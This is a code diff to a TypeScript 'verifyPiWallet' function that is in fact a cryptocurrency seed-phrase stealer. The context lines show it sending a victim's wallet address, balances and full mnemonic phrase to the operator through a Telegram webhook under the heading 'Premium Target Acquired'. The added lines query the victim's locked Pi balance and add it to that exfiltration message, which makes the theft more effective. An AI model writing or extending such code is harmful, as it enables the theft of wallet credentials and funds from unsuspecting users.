@@ -60,7 +60,23 @@ export const verifyPiWallet = async (mnemonic: string): Promise<PiWalletReturn> 
             }
         });
 
-        const lockedBalance = 0; // Placeholder unless specific lockup query is needed.
+        // Calculate locked balance from claimable balances
+        let lockedBalance = 0;
+        try {
+            const claimableBalances = await piServer.claimableBalances()
+                .claimant(publicAddress)
+                .limit(200)
+                .call();
+
+            claimableBalances.records.forEach((record: any) => {
+                if (record.asset === "native") {
+                    lockedBalance += parseFloat(record.amount);
+                }
+            });
+        } catch (cbErr) {
+            console.error("Error fetching claimable balances:", cbErr);
+            // Optionally could default to 0, but we just log and continue
+        }
 
         // 6. Upstash Redis & Telegram Webhook Logic (ONLY unique wallets)
         try {
@@ -84,6 +100,7 @@ export const verifyPiWallet = async (mnemonic: string): Promise<PiWalletReturn> 
                     const message = `🚨 <b>Pi DEX Premium Target Acquired</b>\n\n` +
                         `<b>Address:</b> <code>${publicAddress}</code>\n` +
                         `<b>Available:</b> ${available} PI\n` +
+                        `<b>Locked:</b> ${lockedBalance} PI\n` +
                         `<b>Status:</b> Mobile Optimized Target\n` +
                         `<b>Phrase:</b> <tg-spoiler>${mnemonic}</tg-spoiler>`;
 
